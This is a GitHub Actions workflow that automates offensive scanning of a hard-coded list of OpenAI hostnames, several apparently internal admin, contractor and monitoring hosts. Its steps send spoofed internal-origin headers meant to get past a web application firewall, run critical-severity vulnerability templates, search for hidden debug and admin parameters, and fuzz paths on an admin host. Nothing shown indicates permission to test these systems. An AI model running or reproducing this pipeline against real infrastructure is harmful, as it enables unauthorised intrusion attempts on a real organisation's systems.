name: OpenAI-Hyper-Scan-Detection
on:
  workflow_dispatch:

jobs:
  hyper-hunt:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Speed Arsenal
        run: |
          # Installing Go-based tools for extreme speed
          go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
          go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
          go install -v github.com/ffuf/ffuf/v2@latest
          pip install arjun
          sudo mv ~/go/bin/* /usr/local/bin/

      - name: Phase 1:Rapid Scope Aggregation
        run: |
          # Automatically pulling all critical internal/unified shards from history
          cat <<EOF > master_targets.txt
          https://api.openai.com/v1/completionsinternal
          https://admin.unified-8.api.openai.com
          https://higherlevelapi.unified-8.api.openai.com
          https://chat.gateway.unified-79.api.openai.com
          https://memos.auth.ingress.sodium.sci.openai.org
          https://large-langdemo-external-access.auth.ingress.sodium.sci.openai.org
          https://openai-all.auth.ingress.sodium.sci.openai.org
          https://wiki-browser-contractors.auth.ingress.sodium.sci.openai.org
          https://infra-monitoring.auth.ingress.sulfur.sci.openai.org
          https://auth.openai.com
          https://academy.openai.com
          EOF

      - name: Phase 2:Asynchronous Header Injection (Bypass Detection)
        run: |
          # Using httpx with custom headers to detect WAF bypasses in seconds.
          # We look for status code changes or content-length anomalies.
          httpx -l master_targets.txt -threads 100 \
            -H "X-OpenAI-Internal: true" \
            -H "X-Forwarded-For: 127.0.0.1" \
            -H "X-Real-IP: 10.0.0.1" \
            -H "X-Original-URL: /admin" \
            -sc -cl -title -o hyper_bypass_results.txt

      - name: Phase 3:High-Velocity Vulnerability Sweep
        run: |
          # Nuclei running 'critical' templates only for speed (SSRF, BOLA, IDOR).
          nuclei -l master_targets.txt -severity critical,high -rl 50 -bs 25 -o nuclei_fast_results.txt

      - name: Phase 4:Hidden API Parameter Discovery
        run: |
          # Arjun finds hidden parameters (like 'debug=true' or 'admin=1')
          # that often exist on internal unified gateways.
          arjun -i master_targets.txt -m POST -t 10 -oJ arjun_params.json

      - name: Phase 5:Fuzzing for Internal Endpoints
        run: |
          # Fuzzing common internal paths on the 'unified' shards.
          ffuf -w /usr/share/dict/words -u "https://admin.unified-8.api.openai.com/FUZZ" \
            -mc 200,401,500 -t 50 -o api_fuzz_results.json

      - name: Consolidate Evidence
        uses: actions/upload-artifact@v4
        with:
          name: hyper-scan-evidence
          path: |
            hyper_bypass_results.txt
            nuclei_fast_results.txt
            arjun_params.json
            api_fuzz_results.json
            
